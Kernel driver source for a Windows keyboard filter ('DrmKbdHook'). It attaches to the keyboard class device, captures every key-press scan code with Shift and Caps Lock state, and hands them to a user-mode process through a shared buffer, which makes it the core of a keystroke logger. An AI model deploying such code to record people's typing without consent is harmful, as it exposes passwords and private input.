///////////////////////////////////////////////////////////////////////////////
//
//	Keyboard filter driver project file
//
//	kbdhook.cpp - contain all driver code
//
//		Author:		Baranov Artem
//		Creation date:	??.??.????
//		Last modify:	??.??.????
//
//
///////////////////////////////////////////////////////////////////////////////

extern "C" {
	#include <ntddk.h>
	#include <ntddkbd.h>
}

#include "key_data.h"
#include "kbdhook.h"

static PDEVICE_OBJECT KbdHookDev; //ptr to dev of keyboard hook
static PDEVICE_EXTENSION PdxOfKbdHook; //ptr to device ext of dev of kbd hook
static PDEVICE_OBJECT KbdHookInfDev; //ptr to device for dispatch open/close/devcontrol request
static LONG numPendingIrps; //count of IRP, that must be dispatched

static const WCHAR wszKbdDevName[] = L"\\Device\\KeyboardClass0"; //dev name for attach

static const WCHAR wszKbdHookDevName[] = L"\\Device\\DrmKbdHook0"; //kbd hook dev name
static const WCHAR wszSymLinkName[] = L"\\??\\DrmKbdHook0"; //sym link of dev kbd hook 

static const WCHAR wszEventK[] = KERNEL_EVENT_NAME;
static const WCHAR wszEventU[] = USER_EVENT_NAME;

static enum STATUS_OF_DRIVER {
	UnInitialize, //was successfully executed DriverMain
	Initialize, //was successfully locked shared mem
	LogInProgress //driver copying data in shared buffer
} DriverStatus;

extern "C" { 
NTSTATUS DriverEntry( PDRIVER_OBJECT DriverObj, PUNICODE_STRING RegPath );
//attach kbd hook dev to next lower dev
VOID KbdHookAttachDeviceToDeviceStack( PUNICODE_STRING DevName, 
									   PDEVICE_OBJECT DevForAttach,
									   DEVICE_OBJECT** NextInChainDev);
//log thread start function
VOID ThreadForWriteDataInLog( PVOID ); 
//dispatch all IO requests except Read/DevControl request
NTSTATUS KbdHookDispatchIoRequest( PDEVICE_OBJECT DevObj, PIRP Irp ); 
//dispatch read request
NTSTATUS KbdHookDispatchReadRequest( PDEVICE_OBJECT DevObj, PIRP Irp ); 
//insert item in list
NTSTATUS KbdHookIoCompletion( PDEVICE_OBJECT DevObj, PIRP Irp, PVOID ); 
//write data in user buffer if scan code valid
VOID WriteDataInUserBuffer( PKBD_DATA pKbdData ); 
//release all resources
VOID KbdHookUnload( PDRIVER_OBJECT Driver ); 
//1 if caps lock on 0 otherwise
ULONG CheckKbdOnCapsLockOn( PUNICODE_STRING KbdClassDevName ); 
//1 if need write to client 0 otherwise
ULONG TestOnSpecialKey( PKEYBOARD_INPUT_DATA pKbdInputData ); 
//dispatch device control request
NTSTATUS KbdHookDispatchDevControlRequest( PDEVICE_OBJECT DevObj, PIRP Irp );
//create entry (struct) for shared buf
BOOLEAN CreateKbdDataEntry( PKEYBOARD_INPUT_DATA pKbdInputData ); 
//set driver status in initialize state
NTSTATUS InitializeKbdHook( ULONG IoControlCode, PVOID pInputBuffer, ULONG InputBufferLength,
							PVOID pOutputBuffer, ULONG OutputBufferLength, PIO_STATUS_BLOCK iosb); 
//set driver status in uninitialize state
NTSTATUS UnInitializeKbdHook( ULONG IoControlCode, PVOID pInputBuffer, ULONG InputBufferLength,
							PVOID pOutputBuffer, ULONG OutputBufferLength, PIO_STATUS_BLOCK iosb); 
//set driver status to next state
BOOLEAN SetDriverStatus( STATUS_OF_DRIVER StateForSet ); 
//set driver status to previous state
BOOLEAN UnSetDriverStatus( STATUS_OF_DRIVER StateForUnSet ); 
//dispatch IRP_MJ_POWER on PASSIVE_LEVEL
NTSTATUS KbdHookDispatchPowerRequest( PDEVICE_OBJECT DevObj, PIRP Irp );
}

#ifdef ALLOC_PRAGMA
	#pragma alloc_text(INIT, DriverEntry)
	#pragma alloc_text(PAGE, KbdHookAttachDeviceToDeviceStack)
	#pragma alloc_text(PAGE, KbdHookUnload)
	#pragma alloc_text(PAGE, ThreadForWriteDataInLog)
	#pragma alloc_text(PAGE, KbdHookDispatchIoRequest)
	#pragma alloc_text(PAGE, KbdHookDispatchReadRequest)
	#pragma alloc_text(PAGE, WriteDataInUserBuffer)
	#pragma alloc_text(PAGE, CheckKbdOnCapsLockOn)
	#pragma alloc_text(PAGE, KbdHookDispatchDevControlRequest)
	#pragma alloc_text(PAGE, InitializeKbdHook)
	#pragma alloc_text(PAGE, UnInitializeKbdHook)
	#pragma alloc_text(PAGE, KbdHookDispatchPowerRequest)
#endif

VOID KbdHookAttachDeviceToDeviceStack( PUNICODE_STRING DevName, 
									   PDEVICE_OBJECT DevForAttach,
									   DEVICE_OBJECT** NextInChainDev)
{
	PFILE_OBJECT FileObj;
	PDEVICE_OBJECT TargetDev;

	IoGetDeviceObjectPointer( DevName, FILE_READ_DATA, 
		&FileObj, &TargetDev );

	*NextInChainDev = IoAttachDeviceToDeviceStack( DevForAttach, 
		TargetDev );

	ObDereferenceObject( FileObj );
}

extern "C" NTSTATUS DriverEntry( PDRIVER_OBJECT DriverObj, PUNICODE_STRING RegPath )
{
	NTSTATUS status;
	HANDLE hThread; 
	OBJECT_ATTRIBUTES thread_obj_attr;
	UNICODE_STRING unKbdDevName;
	
	UNICODE_STRING unKbdHookName;
	UNICODE_STRING unSymLinkName;

	enum CodeFailed { Success,
					  CreateInfDev,
					  CreateSymLink,
					  CreateDev,
					  CheckCapsLock,
					  CreateThread} FailedCode = Success;

	for( register ULONG i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++ )
		DriverObj->MajorFunction[i] = KbdHookDispatchIoRequest;

	DriverObj->MajorFunction[IRP_MJ_READ] = KbdHookDispatchReadRequest;
	DriverObj->DriverUnload = KbdHookUnload;
	DriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KbdHookDispatchDevControlRequest;
	DriverObj->MajorFunction[IRP_MJ_POWER] = KbdHookDispatchPowerRequest;

	RtlInitUnicodeString( &unKbdHookName, wszKbdHookDevName );
	RtlInitUnicodeString( &unSymLinkName, wszSymLinkName );

	__try
	{
		status = IoCreateDevice( DriverObj, 
								 0L, // dev ext size
								 &unKbdHookName, // name
								 FILE_DEVICE_UNKNOWN,
								 0L, // dev char
								 TRUE, //exclusive access
								 &KbdHookInfDev );
		
		if( !NT_SUCCESS( status ) )
		{
			FailedCode = CreateInfDev;
			DRMPRINT( "can not create additional device" );
			__leave;
		}

		status = IoCreateSymbolicLink( &unSymLinkName, &unKbdHookName );

		if( !NT_SUCCESS( status ) )
		{
			FailedCode = CreateSymLink;
			DRMPRINT( "can not create symbolic link" );
			__leave;
		}

		status = IoCreateDevice( DriverObj, 
								 sizeof(DEVICE_EXTENSION), // dev ext size
								 NULL, // name
								 FILE_DEVICE_KEYBOARD,
								 0L, // dev char
								 TRUE, //exclusive access
								 &KbdHookDev );

		if( !NT_SUCCESS( status ) )
		{
			FailedCode = CreateDev;
			DRMPRINT( "can not create dev" );
			__leave;
		}

		KbdHookDev->Flags = KbdHookDev->Flags | 
			( DO_BUFFERED_IO | DO_POWER_PAGABLE );
		KbdHookDev->Flags = KbdHookDev->Flags & 
			~DO_DEVICE_INITIALIZING;

		PdxOfKbdHook = (PDEVICE_EXTENSION)((PDEVICE_EXTENSION)KbdHookDev->DeviceExtension);
		
		RtlZeroMemory( PdxOfKbdHook, sizeof( DEVICE_EXTENSION ) );

		InitializeListHead( &PdxOfKbdHook->ChListHead );
		
		KeInitializeSemaphore( &PdxOfKbdHook->SemForGuardQueue, 0, MAXLONG );
		KeInitializeSpinLock( &PdxOfKbdHook->LockForList );
		ExInitializeNPagedLookasideList( &PdxOfKbdHook->LookasideList, 
										 NULL, // alloc func  
										 NULL, // free func
										 0, // flags
										 sizeof( KBD_DATA ), // size entry
										 'hdbK',
										 0 // must be zero
										 );
		KeInitializeEvent( &PdxOfKbdHook->NeedThreadTerminate, 
			SynchronizationEvent, FALSE );

		RtlInitUnicodeString( &unKbdDevName, wszKbdDevName );

		KbdHookAttachDeviceToDeviceStack( &unKbdDevName, KbdHookDev, 
			&PdxOfKbdHook->NextDevInChain );

		if( !CheckKbdOnCapsLockOn( &unKbdDevName ) )
		{
			status = STATUS_UNSUCCESSFUL;
			FailedCode = CheckCapsLock;
			DRMPRINT( "can not check caps lock" );
			__leave;
		}

		InitializeObjectAttributes( &thread_obj_attr, NULL, 
			OBJ_KERNEL_HANDLE, NULL, NULL );
		
		status = PsCreateSystemThread( &hThread,
							  THREAD_ALL_ACCESS, // access type
							  &thread_obj_attr,
							  NULL, // target proc handle
							  NULL, // client_id
							  ThreadForWriteDataInLog, //start func
							  NULL // ptr context
							  );

		if( !NT_SUCCESS( status ) )
		{
			FailedCode = CreateThread;
			DRMPRINT( "can not create system thread" );
			__leave;
		}
		
		ObReferenceObjectByHandle( hThread, 
								   THREAD_ALL_ACCESS, 
								   NULL, // object type
								   KernelMode, &PdxOfKbdHook->pThread, 
								   NULL // handle info
								   );
		ZwClose( hThread );

		DRMPRINT( "load success" );
	
	}
	__finally
	{
		switch( FailedCode )
		{
			case CreateThread:
			case CheckCapsLock:
			{
				ExDeleteNPagedLookasideList( &PdxOfKbdHook->LookasideList );
				IoDetachDevice( PdxOfKbdHook->NextDevInChain );
				IoDeleteDevice( KbdHookDev );
			}
			case CreateDev:
			{
				IoDeleteSymbolicLink( &unSymLinkName );
			}
			case CreateSymLink:
			{
				IoDeleteDevice( KbdHookInfDev );
			}
			case CreateInfDev:
			default:
				break;
		}
	}

	return status;
}

VOID ThreadForWriteDataInLog( PVOID )
{
	PVOID Objects[] = { &PdxOfKbdHook->SemForGuardQueue, 
					  &PdxOfKbdHook->NeedThreadTerminate };
	NTSTATUS status;
	ULONG NeedTerminate = 0;
	PKBD_DATA pKbdData;

	KeSetPriorityThread( KeGetCurrentThread(), LOW_REALTIME_PRIORITY );

	while( 1 )
	{
		status = KeWaitForMultipleObjects( 2, // objects count
									  Objects,
									  WaitAny,
									  Executive,
									  KernelMode,
									  0L,
									  NULL, // timeout
									  NULL );
		
		switch( status )
		{
			case STATUS_WAIT_0: // write data in log
			{
				pKbdData = (PKBD_DATA) 
					ExInterlockedRemoveHeadList( &PdxOfKbdHook->ChListHead, 
												 &PdxOfKbdHook->LockForList );
				
				WriteDataInUserBuffer( pKbdData );

				ExFreeToNPagedLookasideList( &PdxOfKbdHook->LookasideList, 
					pKbdData ); // utilize mem

				PdxOfKbdHook->numCachedEntry--;
				
				break;
			}
			
			case STATUS_WAIT_1: // break execution
			{
				NeedTerminate = 1;
				break;
			}
			default:
				break;
		}

		if( NeedTerminate ) break;
	}

	while( !IsListEmpty( &PdxOfKbdHook->ChListHead ) )
	{
		pKbdData = (PKBD_DATA) 
			ExInterlockedRemoveHeadList( &PdxOfKbdHook->ChListHead, 
										 &PdxOfKbdHook->LockForList );

		//WriteDataInUserBuffer( pKbdData );

		ExFreeToNPagedLookasideList( &PdxOfKbdHook->LookasideList, 
			pKbdData ); // utilize mem

		PdxOfKbdHook->numCachedEntry--;
	}

	/*pKbdData = (PKBD_DATA)ExAllocatePoolWithTag( PagedPool, sizeof( KBD_DATA ), 'hdbK' );
	pKbdData->MakeCode = pKbdData->ShiftPressed = 
		pKbdData->CapsLockOn = 0xFFFF;
	
	WriteDataInUserBuffer( pKbdData );

	ExFreePool( pKbdData );*/

	PsTerminateSystemThread( STATUS_SUCCESS );
		
} 

VOID WriteDataInUserBuffer( PKBD_DATA pKbdData )
{
	NTSTATUS status;
	ULONG IsLogProgress;
	PKEY pKey;

	if( DriverStatus != LogInProgress )
	{
		DRMKDPRINT( "can not write data in user buffer because driver is not corresponded state" );
		return;
	}

	status = KeWaitForSingleObject( PdxOfKbdHook->pEventU, Executive, 
		KernelMode, FALSE, NULL );

	if( status == STATUS_SUCCESS )
	{
		pKey = (PKEY)PdxOfKbdHook->BufferForLog;

		pKey->ScanCode = pKbdData->MakeCode;
		pKey->CapsLockOn = pKbdData->CapsLockOn;
		pKey->ShiftPressed = pKbdData->ShiftPressed;
		
		KeSetEvent( PdxOfKbdHook->pEventK, IO_NO_INCREMENT, FALSE );
	}
	else
	{
		DRMKDPRINT("wait not success");
	}
}

NTSTATUS KbdHookDispatchIoRequest( PDEVICE_OBJECT DevObj, PIRP Irp )
{
	NTSTATUS status;
	PIO_STACK_LOCATION IoStack = IoGetCurrentIrpStackLocation( Irp );

	if( DevObj == KbdHookInfDev )
	{
		if( IoStack->MajorFunction == IRP_MJ_CLOSE || 
			IoStack->MajorFunction == IRP_MJ_CREATE ||
			IoStack->MajorFunction == IRP_MJ_CLEANUP )
		{
			status = STATUS_SUCCESS;
			DRMKDPRINT( "successfully open/close handle" );
		}
		else
		{
			status = STATUS_NOT_IMPLEMENTED;
			DRMKDPRINT( "try call not implemented function" );
		}
			
		Irp->IoStatus.Status = status;
		Irp->IoStatus.Information = 0L;

		IoCompleteRequest( Irp, IO_NO_INCREMENT );
		
		return status;
	}
	
	IoSkipCurrentIrpStackLocation( Irp );

	return IoCallDriver( PdxOfKbdHook->NextDevInChain, Irp );
}

NTSTATUS KbdHookDispatchReadRequest( PDEVICE_OBJECT DevObj, PIRP Irp )
{
	if( DevObj == KbdHookInfDev )
	{
		Irp->IoStatus.Status = STATUS_NOT_IMPLEMENTED;
		Irp->IoStatus.Information = 0L;
		DRMKDPRINT( "try call not implemented read function" );

		IoCompleteRequest( Irp, IO_NO_INCREMENT );
		
		return STATUS_NOT_IMPLEMENTED;
	}

	IoCopyCurrentIrpStackLocationToNext( Irp );

	IoSetCompletionRoutine( Irp, KbdHookIoCompletion, NULL, 
		TRUE, TRUE, TRUE );

	InterlockedIncrement( &numPendingIrps );

	return IoCallDriver( PdxOfKbdHook->NextDevInChain, Irp );
}

NTSTATUS KbdHookIoCompletion( PDEVICE_OBJECT DevObj, PIRP Irp, PVOID )
{
	ULONG cKbdStruct;
	PKEYBOARD_INPUT_DATA pKbdInputData;
	BOOLEAN IsUpper;
	
	if( Irp->PendingReturned )
		IoMarkIrpPending( Irp );
	
	InterlockedDecrement( &numPendingIrps );

	if( Irp->IoStatus.Status != STATUS_SUCCESS ) 
		return Irp->IoStatus.Status;

	cKbdStruct = Irp->IoStatus.Information / sizeof( KEYBOARD_INPUT_DATA );
	pKbdInputData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;

	for( register ULONG i = 0; i < cKbdStruct; i++, pKbdInputData++ )
	{
		if( !TestOnSpecialKey( pKbdInputData ) ) continue;
		if( DriverStatus != LogInProgress ) continue;
		
		if( CreateKbdDataEntry( pKbdInputData ) )
		{
			KeReleaseSemaphore( &PdxOfKbdHook->SemForGuardQueue, 
								IO_KEYBOARD_INCREMENT, // priority increment
								1, // inc semaphore count
								FALSE // wait
								);
		}
	}

	return STATUS_SUCCESS;
}

ULONG TestOnSpecialKey( PKEYBOARD_INPUT_DATA pKbdInputData )
{
	if( pKbdInputData->MakeCode == KEY_CAPS_LOCK_CODE && pKbdInputData->Flags == KEY_BREAK )
	{
		if( PdxOfKbdHook->Caps_Lock == 0 ) 
		{
			InterlockedIncrement( (PLONG)&PdxOfKbdHook->Caps_Lock );
			DRMKDPRINT( "caps lock on" );
		}
		else 
		{
			InterlockedDecrement( (PLONG)&PdxOfKbdHook->Caps_Lock );
			DRMKDPRINT( "caps lock off" );
		}
	}
	
	switch( pKbdInputData->MakeCode )
	{
		case KEY_CAPS_LOCK_CODE:
		return 0L;
	}

	return 1L;
}

BOOLEAN CreateKbdDataEntry( PKEYBOARD_INPUT_DATA pKbdInputData )
{
	PKBD_DATA pKbdData;
	PKEYBOARD_INPUT_DATA pTmpEntry = pKbdInputData;
	BOOLEAN IsUpper = FALSE;

	if( pKbdInputData->MakeCode == KEY_SHIFT_CODE )
	{
		if( pKbdInputData->Flags == KEY_MAKE )
		{
			PdxOfKbdHook->ShiftPressed = 1;
		}
		else
		{ //pKbdInputData->Flags == KEY_BREAK
			PdxOfKbdHook->ShiftPressed = 0;
		}
		return 0;
	}
	if( pKbdInputData->Flags == KEY_BREAK )
		return 0;
	if( PdxOfKbdHook->numCachedEntry > MAX_CACHED_ENTRY )
		return 0;

	pKbdData = 
			(PKBD_DATA)ExAllocateFromNPagedLookasideList( &PdxOfKbdHook->LookasideList ); // alloc mem
	
	if( !pKbdData )
		return 0;

	pKbdData->MakeCode = pKbdInputData->MakeCode;

	ExInterlockedInsertTailList( &PdxOfKbdHook->ChListHead, 
		&pKbdData->NextStruct, &PdxOfKbdHook->LockForList );

	pKbdData->ShiftPressed = (USHORT)PdxOfKbdHook->ShiftPressed;
	pKbdData->CapsLockOn = (USHORT)PdxOfKbdHook->Caps_Lock;
	
	PdxOfKbdHook->numCachedEntry++;

	return 1;
}

VOID KbdHookUnload( PDRIVER_OBJECT Driver )
{
	KTIMER timer;
	LARGE_INTEGER timeout;
	UNICODE_STRING unSymLinkName;

	if( DriverStatus == LogInProgress )
		UnSetDriverStatus( LogInProgress );

	RtlInitUnicodeString( &unSymLinkName, wszSymLinkName );

	timeout.QuadPart = 1000000;

	IoDetachDevice( PdxOfKbdHook->NextDevInChain );

	while( numPendingIrps > 0 )
		KeDelayExecutionThread( KernelMode, FALSE, &timeout );

	KeSetEvent( &PdxOfKbdHook->NeedThreadTerminate, IO_NO_INCREMENT, FALSE );

	KeWaitForSingleObject( PdxOfKbdHook->pThread, 
						   Executive, KernelMode,
						   FALSE,
						   NULL);

	ObDereferenceObject( PdxOfKbdHook->pThread );
	ExDeleteNPagedLookasideList( &PdxOfKbdHook->LookasideList );

	if( DriverStatus != UnInitialize )
	{
		MmUnmapLockedPages( PdxOfKbdHook->BufferForLog, PdxOfKbdHook->MdlOfBufferForLog );
		MmUnlockPages( PdxOfKbdHook->MdlOfBufferForLog );
		IoFreeMdl( PdxOfKbdHook->MdlOfBufferForLog );
		ObDereferenceObject( PdxOfKbdHook->pEventK );
		ObDereferenceObject( PdxOfKbdHook->pEventU );
	}

	IoDeleteSymbolicLink( &unSymLinkName );
	IoDeleteDevice( KbdHookInfDev );
	
	IoDeleteDevice( KbdHookDev );

	DRMPRINT( "unload driver" );
}

ULONG CheckKbdOnCapsLockOn( PUNICODE_STRING KbdClassDevName )
{
	PFILE_OBJECT FileObj;
	PDEVICE_OBJECT TargetDev;
	KEYBOARD_UNIT_ID_PARAMETER kbd_id_param = { 0 };
	KEYBOARD_INDICATOR_PARAMETERS kbd_indicator;
	KEVENT kevent;
	IO_STATUS_BLOCK IoStatusBlock; 
	PIRP Irp;
	NTSTATUS status;

	status = IoGetDeviceObjectPointer( KbdClassDevName, FILE_READ_DATA, 
		&FileObj, &TargetDev );

	if( !NT_SUCCESS( status ) )
	{
		DRMKDPRINT( "dev name invalid" );
		return 0L;
	}

	KeInitializeEvent( &kevent, NotificationEvent, TRUE );

	Irp = IoBuildDeviceIoControlRequest( IOCTL_KEYBOARD_QUERY_INDICATORS, 
		TargetDev, 
		&kbd_id_param, // input buffer
		sizeof( KEYBOARD_UNIT_ID_PARAMETER ), // input buffer size
		&kbd_indicator, // out buffer
		sizeof( KEYBOARD_INDICATOR_PARAMETERS ), // out buffer length
		TRUE, // IRP_MJ_INTERNAL_DEVICE_CONTROL
		&kevent,
		&IoStatusBlock );

	status = IoCallDriver( TargetDev, Irp );

	if( status == STATUS_PENDING )
	{
		KeWaitForSingleObject( &kevent, Executive, KernelMode, FALSE, NULL ); 
		status = IoStatusBlock.Status;
	}

	ObDereferenceObject( FileObj );

	if( status == STATUS_SUCCESS )
	{
		if( kbd_indicator.LedFlags & KEYBOARD_CAPS_LOCK_ON )
		{
			InterlockedIncrement( (PLONG)&PdxOfKbdHook->Caps_Lock );
			DRMKDPRINT( "caps lock test success: on" );
		}
		else
		{
			DRMKDPRINT( "caps lock test success: off" );
		}
		status = 1L;
	}
	else if( status == STATUS_INVALID_PARAMETER )
	{
		DRMKDPRINT( "caps lock test failed: UnitId value is not valid" );
		status = 0L;
	}
	else if( status == STATUS_BUFFER_TOO_SMALL )
	{
		DRMKDPRINT( "caps lock test failed:  output buffer cannot hold the KEYBOARD_INDICATOR_PARAMETERS structure" );
		status = 0L;
	}

	return status;
}

NTSTATUS KbdHookDispatchDevControlRequest( PDEVICE_OBJECT DevObj, PIRP Irp )
{
	PIO_STACK_LOCATION IoStack;
	ULONG transfer_bytes = 0;
	NTSTATUS status = STATUS_SUCCESS;

	if( DevObj != KbdHookInfDev )
	{
		IoSkipCurrentIrpStackLocation( Irp );
		return IoCallDriver( PdxOfKbdHook->NextDevInChain, Irp );
	}
	
	IoStack = IoGetCurrentIrpStackLocation( Irp );

	switch( IoStack->Parameters.DeviceIoControl.IoControlCode )
	{
		case IOCTL_KBD_HOOK_UNINIT:
		{
			status = UnInitializeKbdHook( IoStack->Parameters.DeviceIoControl.IoControlCode,
				Irp->AssociatedIrp.SystemBuffer, IoStack->Parameters.DeviceIoControl.InputBufferLength,
				Irp->AssociatedIrp.SystemBuffer, IoStack->Parameters.DeviceIoControl.OutputBufferLength,
				&Irp->IoStatus );
			break;
		}
		case IOCTL_KBD_HOOK_INIT:
		{
			status = InitializeKbdHook( IoStack->Parameters.DeviceIoControl.IoControlCode,
				Irp->AssociatedIrp.SystemBuffer, IoStack->Parameters.DeviceIoControl.InputBufferLength,
				Irp->AssociatedIrp.SystemBuffer, IoStack->Parameters.DeviceIoControl.OutputBufferLength,
				&Irp->IoStatus );
			break;
		}
		case IOCTL_KBD_HOOK_START:
		{
			if( DriverStatus != Initialize )
			{
				DRMKDPRINT( "kbd hook start not success" );
				status = STATUS_UNSUCCESSFUL;
			}
			else
			{
				DRMKDPRINT( "kbd hook start success" );
				SetDriverStatus( LogInProgress );
			}

			Irp->IoStatus.Information = 0L;
			Irp->IoStatus.Status = status;
			break;
		}
		case IOCTL_KBD_HOOK_STOP:
		{
			if( DriverStatus != LogInProgress )
			{
				DRMKDPRINT( "kbd hook stop not success" );
				status = STATUS_UNSUCCESSFUL;
			}
			else
			{
				DRMKDPRINT( "kbd hook stop success" );
				UnSetDriverStatus( LogInProgress );
			}

			Irp->IoStatus.Information = 0L;
			Irp->IoStatus.Status = status;
			break;
		}
		default:
		{
			DRMKDPRINT( "try using unimplemented request" );
			Irp->IoStatus.Information = 0L;
			status = Irp->IoStatus.Status = STATUS_NOT_IMPLEMENTED;
			
		}
	}

	IoCompleteRequest( Irp, IO_NO_INCREMENT );

	return status;
	
}


NTSTATUS InitializeKbdHook( ULONG IoControlCode, PVOID pInputBuffer, ULONG InputBufferLength,
							   PVOID pOutputBuffer, ULONG OutputBufferLength, PIO_STATUS_BLOCK iosb)
{
	PFOR_INIT_KBD_HOOK pInitKbdStruct;
	ULONG excpt = 0;
	UNICODE_STRING unEventK;
	UNICODE_STRING unEventU;
	HANDLE hEventK;
	HANDLE hEventU;
	KIRQL OldIrql;
	
	if( DriverStatus != UnInitialize )
	{
		DRMKDPRINT( "driver already initialized or log started" );
		iosb->Information = 0L;
		iosb->Status = STATUS_UNSUCCESSFUL;
		return STATUS_UNSUCCESSFUL;
	}

	if( InputBufferLength != sizeof( FOR_INIT_KBD_HOOK ) || pInputBuffer == NULL )
	{
		DRMKDPRINT( "buffer small" );
		iosb->Information = 0L;
		iosb->Status = STATUS_BUFFER_TOO_SMALL;
		return STATUS_BUFFER_TOO_SMALL;
	}

	pInitKbdStruct = (PFOR_INIT_KBD_HOOK)pInputBuffer;

	RtlInitUnicodeString( &unEventK, wszEventK );
	RtlInitUnicodeString( &unEventU, wszEventU );

	PdxOfKbdHook->pEventK = 
		IoCreateSynchronizationEvent( &unEventK, &hEventK );

	ObReferenceObjectByHandle( hEventK, EVENT_ALL_ACCESS, NULL, 
		KernelMode, (VOID**)&PdxOfKbdHook->pEventK, NULL );

	ZwClose( hEventK );
	//проработать ситуацию с созданием а не открытием
	
	PdxOfKbdHook->pEventU = 
		IoCreateSynchronizationEvent( &unEventU, &hEventU );

	ObReferenceObjectByHandle( hEventU, EVENT_ALL_ACCESS, NULL, 
		KernelMode, (VOID**)&PdxOfKbdHook->pEventU, NULL );

	ZwClose( hEventU );
	//проработать ситуацию с созданием а не открытием

	PdxOfKbdHook->MdlOfBufferForLog = IoAllocateMdl( pInitKbdStruct->StartVA, 
		pInitKbdStruct->Size,
		FALSE, // this MDL not assign with IRP
		TRUE, // charge quota
		NULL // ptr to IRP
		);

	if( PdxOfKbdHook->MdlOfBufferForLog == NULL )
	{
		DRMKDPRINT( "allocate MDL for VA failed" );
		iosb->Information = 0L;
		iosb->Status = STATUS_INVALID_USER_BUFFER;
		return STATUS_INVALID_USER_BUFFER;
	}

	__try
	{
		MmProbeAndLockPages( PdxOfKbdHook->MdlOfBufferForLog,
			KernelMode, IoWriteAccess);
	}
	__except( GetExceptionCode() == STATUS_ACCESS_VIOLATION )
	{
		excpt = 1;
	}

	if( excpt == 1 )
	{
		DRMKDPRINT( "lock pages failed" );
		IoFreeMdl( PdxOfKbdHook->MdlOfBufferForLog );
		iosb->Information = 0L;
		iosb->Status = STATUS_INVALID_USER_BUFFER;
		return STATUS_INVALID_USER_BUFFER;
	}

	PdxOfKbdHook->BufferForLog = MmMapLockedPagesSpecifyCache(
		PdxOfKbdHook->MdlOfBufferForLog,
		KernelMode,
		MmCached, //memory cached
		NULL, //region base address set NT
		FALSE, // must be false
		NormalPagePriority // pages priority
		);

	SetDriverStatus( Initialize );
	
	DRMKDPRINT( "kbd hook init success" );

	iosb->Information = 0L;
	iosb->Status = STATUS_SUCCESS;
	return STATUS_SUCCESS;
}

NTSTATUS UnInitializeKbdHook( ULONG IoControlCode, PVOID pInputBuffer, ULONG InputBufferLength,
								 PVOID pOutputBuffer, ULONG OutputBufferLength, PIO_STATUS_BLOCK iosb)
{
	ULONG IsInitDriver;
	NTSTATUS status = STATUS_SUCCESS;
	
	__try
	{
		if( DriverStatus != Initialize )
		{
			DRMKDPRINT( "try uninitialize driver that monitor in progress" );
			status = STATUS_UNSUCCESSFUL;
			__leave;
		}

		MmUnmapLockedPages( PdxOfKbdHook->BufferForLog, PdxOfKbdHook->MdlOfBufferForLog );
		MmUnlockPages( PdxOfKbdHook->MdlOfBufferForLog );
		IoFreeMdl( PdxOfKbdHook->MdlOfBufferForLog );
		ObDereferenceObject( PdxOfKbdHook->pEventK );
		ObDereferenceObject( PdxOfKbdHook->pEventU );

		UnSetDriverStatus( Initialize );
		DRMKDPRINT( "kbd hook uninit success" );
	}
	__finally
	{
		iosb->Status = status;
		iosb->Information = 0L;
	}

	return status;
}

BOOLEAN SetDriverStatus( STATUS_OF_DRIVER StateForSet )
{
	STATUS_OF_DRIVER PrevState = (STATUS_OF_DRIVER)((ULONG)StateForSet - 1);

	if( StateForSet == UnInitialize ) return FALSE;

	if( DriverStatus == PrevState )
		InterlockedIncrement( (LONG*)&DriverStatus );
	else
		return FALSE;

	return TRUE;
}

BOOLEAN UnSetDriverStatus( STATUS_OF_DRIVER StateForUnSet )
{
	if( StateForUnSet == UnInitialize ) return FALSE;

	if( DriverStatus == StateForUnSet )
		InterlockedDecrement( (LONG*)&DriverStatus );
	else return FALSE;

	return TRUE;
}

NTSTATUS KbdHookDispatchPowerRequest( PDEVICE_OBJECT DevObj, PIRP Irp )
{
	/*PIO_STACK_LOCATION IoStack = IoGetCurrentIrpStackLocation( Irp );

	if( IoStack->MinorFunction == IRP_MN_SET_POWER )
	{
		if( IoStack->Parameters.Power.Type == SystemPowerState )
		{
			switch( IoStack->Parameters.Power.State.SystemState == PowerSystemWorking )
		}
	}*/

	PoStartNextPowerIrp( Irp );
	IoSkipCurrentIrpStackLocation( Irp );

	return PoCallDriver( PdxOfKbdHook->NextDevInChain, Irp );
}